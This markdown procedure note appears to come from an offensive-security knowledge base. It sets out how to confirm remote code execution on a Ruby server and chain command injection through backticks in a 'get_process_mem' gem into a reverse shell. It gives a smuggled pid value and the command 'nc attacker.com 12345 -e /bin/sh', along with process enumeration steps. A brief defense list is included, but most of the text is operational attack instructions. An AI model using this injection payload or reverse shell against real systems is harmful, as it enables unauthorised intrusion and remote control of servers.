---
id: proc-verify-execution-injection
tags:
  - verification
  - command-injection
  - reverse-shell
type: procedure
tools:
  - '[[tools/nc-netcat]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/cat-tmp-vakzz]]'
  - '[[commands/ps-auxww]]'
  - '[[commands/nc-reverse-shell]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Command-Line Interface]]'
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:24:15.029Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Command-Line Interface]]'
  - '[[Unix Shell]]'
---
# Verify-Payload-Execution-and-Command-Injection

## Summary

This procedure verifies RCE by checking payload effects and chains to command injection in get_process_mem for process enumeration and reverse shell.

## Description

Payload writes to /tmp; logs show traversal. Chaining: Load get_process_mem via Redis, inject in ps_memory's backticks with pid: '`nc attacker.com 12345 -e /bin/sh`', enabling shell without path prediction.

## Requirements

1. RCE triggered
2. Server access for verification (or logs)
3. Listener for reverse shell

## Defense

Defensive measures and detection strategies:

- Audit gem loads and backtick usage
- Monitor /tmp writes and nc connections
- Sanitize options hash in gems

## Objectives

1. Confirm code execution
2. Escalate to interactive shell
3. Enumerate server processes

## Instructions

### Step 1: Check Verification File

**Context**: Read /tmp file written by payload.

**Command** ([[commands/cat-tmp-vakzz]]):

```bash
cat /tmp/vakzz
```

> Expected: vakzz was here.

### Step 2: Enumerate Processes

**Context**: In shell, list processes to assess compromise.

**Command** ([[commands/ps-auxww]]):

```bash
ps auxww
```

> Expected: List of puma, nginx, etc.

### Step 3: Establish Reverse Shell

**Context**: Inject nc for shell via command chain.

**Command** ([[commands/nc-reverse-shell]]):

```bash
nc attacker.com 12345 -e /bin/sh
```

> Expected: Shell connected to listener.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Command-Line Interface]] Command and Scripting Interpreter
- [[Unix Shell]] Unix Shell

### Sub-Techniques


## Commands Used

- [[commands/cat-tmp-vakzz]]
- [[commands/ps-auxww]]
- [[commands/nc-reverse-shell]]

## Tools Used

- [[tools/nc-netcat]]

## Tags

- verification
- command-injection
- reverse-shell
